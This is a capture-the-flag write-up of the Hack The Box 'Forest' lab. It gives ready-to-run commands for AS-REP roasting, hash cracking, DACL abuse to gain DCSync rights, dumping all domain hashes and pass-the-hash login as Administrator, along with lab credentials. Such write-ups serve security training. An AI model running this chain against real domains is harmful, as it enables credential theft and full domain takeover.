#box #asreproasting #impacket-GetNPUsers #hashcat #BloodHound #GenericAll #WriteDACL #dcsync #impacket-dacledit #impacket-secretsdump 

>Always give a look to DONT_REQ_PREAUTH users with `impacket-GetNPUsers`. When all the roads feels blocked maybe an user is available to ASREPRoasting

Forest is a machine that involves an ASREPRoast attack. Once obtained the initial foothold, we realize this foothold is a service user that can connect via WinRM. After authenticating we also extract the AD with bloodhound and then by properly reading the graph and looking at the query `Shortest Path to Domain Admins` we realize that we can perform a layered attack by exploiting the fact that we belong to the group of `Account Operators` that have `GenericAll` on the group `Exchange Windows Permissions`. Once added ourselves to the `Exchange Windows Permissions` group we can now add a privilege over the domain to our user with `WriteDacl`. Since we can do so, we add to our user the privileged of `DCSync` and we then perform a DCSync attack to extract the `NTDS.dit` and recover the hashes of all the users of the domain. Unable to gain the clear-text password we proceed with a PtH attack over `evil-winrm`.
## Nmap

```bash
# Nmap 7.95 scan initiated Tue Sep  2 10:10:58 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 10.129.95.210
Nmap scan report for 10.129.95.210
Host is up (0.12s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-09-02 14:17:55Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-09-02T07:18:00-07:00
| smb2-time: 
|   date: 2025-09-02T14:18:01
|_  start_date: 2025-09-02T14:15:34
|_clock-skew: mean: 2h26m49s, deviation: 4h02m30s, median: 6m49s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  2 10:11:22 2025 -- 1 IP address (1 host up) scanned in 23.83 seconds
```
## DONT_REQ_PREAUTH = TRUE to ASREPRoasting

After some research we discover that we must use `impacket-getNPUsers` to look for all the users that have the Kerberos field `DONT_REQ_PREAUTH` to true. Fundamentally, Kerberos works in a way that as a pre-authentication a TGT (Ticket Granting Ticket) is requested. Once this TGT is requested a ST (Service Ticket) can be crafted in order to properly access to the given account.  This `DONT_REQ_PREAUTH` set to true changes this logic by skipping the necessity of crafting a TGT to properly access an account, it basically allows us to bypass a step to the authentication. 
This attack is called ASREPRoasting. To perform that attack we can use both `Kerbrute` or `impacket-GetNPUsers`:

```bash
impacket-GetNPUsers -dc-ip 10.129.95.210 -request 'htb.local/' -format hashcat
```

We'll then obtain a hash in a form `krb5asrep` corresponding to hashcat's mode 18200 for the user `svc-alfresco`:

```bash
hashcat -m 18200 svc-alfresco_asrep.txt /usr/share/wordlists/rockyou.txt
```

Obtaining in the end the credentials: `svc-alfresco:s3rvice`. 
With that user we finally have some access onto the target.

## Bloodhound

Within `evil-winrm`, after discovering that SMB doesn't show anything important to us, we find out that we can access remotely onto the machine. 
Alongside that, and taking the user key, we perform a bloodhound extraction and then proceed with consulting the AD graph.

With an older version of bloodhound, we ended up following a wrong path to privilege escalation, after updating the version to the newer one we've discovered the right path to Domain Admins:

![[attachments/forest-writeup-1.webp]]

The graph must be read as it follows:
* `svc-alfresco`, our owned user, is member of `Service Accounts`
* `Service Accounts` is member of `Privileged IT Accounts`
* `Privileged IT Accounts` is member of `Account Operators`
* `Account Operators` have a `GenericAll` permission over `Exchange Windows Permissions`
* `Exchange Windows Permissions` has `WriteDacl` over the domain
* Lastly, the domain has then control over the rest of the units belonging to it

To properly escalate privileges then we have 3 steps to make:
* Leverage the `GenericAll` permission and become part of `Exchange Windows Permissions` group
* Use `WriteDacl` to add to our user the `DCSync` privilege over the domain
* Use `mimikatz` or `impacket-secretsdump` to properly dump all the credentials of the users in the domain

### Becoming part of `Exchange Windows Permissions`

To add ourselves to the target group, we'll use `PowerView` and its `Add-DomainGroupMember` function.
Thus, we first download and transfer PowerView on the target machine with `evil-winrm` function: `upload PowerView.ps1`
We then `Import-Module ./PowerView.ps1` and then we must first create a credentials object on PowerShell:

```powershell
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $SecPassword)
```

And then use the `$Cred` object to add ourselves to the group:

```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco' -Credential $Cred
```

To double check that it worked we can use:

```powershell
Get-DomainGroupMember -Identity 'Exchange Windows Permissions'
```
### Gaining `DCSync` over the domain with `WriteDacl`

We finally belong to the group `Exchange Windows Permissions`, this permits us to effectively add to our user the `DCSync` privilege by exploiting the `WriteDacl` permission. To do so, we opt to use `impacket-dacledit`:

```bash
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice' -dc-ip 10.129.196.127
```
### Dumping the credentials

Finally, since we now have `DCSync` we are now able to dump all the available credentials in the domain by exploiting the `NTDS.dit` secrets:

```bash
impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.196.127
```

After trying to crack the password unsuccessfully, we opt to perform a PtH attack with `evil-winrm`, obtaining Domain takeover:

```bash
evil-winrm -u Administrator -i forest.local.htb -H 32693b11e6aa90eb43d32c72a07ceea6
```